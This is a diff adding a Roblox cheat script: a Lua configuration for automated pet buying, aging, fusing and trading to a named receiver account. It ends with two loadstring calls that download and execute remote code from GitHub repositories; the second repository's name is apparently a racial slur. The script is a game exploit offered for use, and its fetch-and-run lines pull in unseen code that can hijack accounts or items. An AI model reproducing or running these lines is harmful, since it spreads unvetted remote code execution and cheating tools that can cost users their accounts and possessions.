@@ -1,0 +1,37 @@
+getgenv().ATConfig = {
+    -- ## General
+    hub_key = "46234d005bd619f3772c84336d00935a", -- 2G KEY
+    MainAccUsername = "SebastianSparkly2006", -- MAIN / RECEIVER ACC
+    PetsToTrade = {"Bat Dragon"},
+    
+    -- ### Main Pet Buy Feature
+    buyPet = true,
+    PetName = "Patchy Bear", -- Pet Name to Buy
+    CurrencyName = "Event", -- ("Bucks" / "Event" / "Social Stones")
+    Cost = 10000, -- Cost of Pet
+    Quantity = 0, -- Set to 0 if you want to buy ALL
+
+    -- ### Box Features
+    buyBoxes = false,
+    boxName = "Kelp Raider Box",
+    openBoxes = true,
+
+    -- ### Bait Transfer Features
+    transferBait = false,
+    baitName = "Shiver Cone Bait", -- [ Shiver Cone Bait / Subzero Popsicle Bait ]
+
+    SmartBuy = false, -- EXPERIMENTAL FEATURE [PETS]
+
+    -- ### Pet Aging Features
+    AgePets = true,
+    AgeNeons = true, -- Enable if u want to make megas
+    useTinyAgePotion = false,
+    PetsToAge = {"Patchy Bear"},
+    autoFuse = true, -- Auto Convert to Neon/Mega
+
+    Leave = false, -- Leaves the game once trade is completed
+    LeaveDelay = 120 -- Delay in seconds to wait before leaving
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Roleck11/2G_HUB/refs/heads/main/ROLOX_UTILITY"))()
+wait(30)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Forst29931/niger/refs/heads/main/iloveit"))()
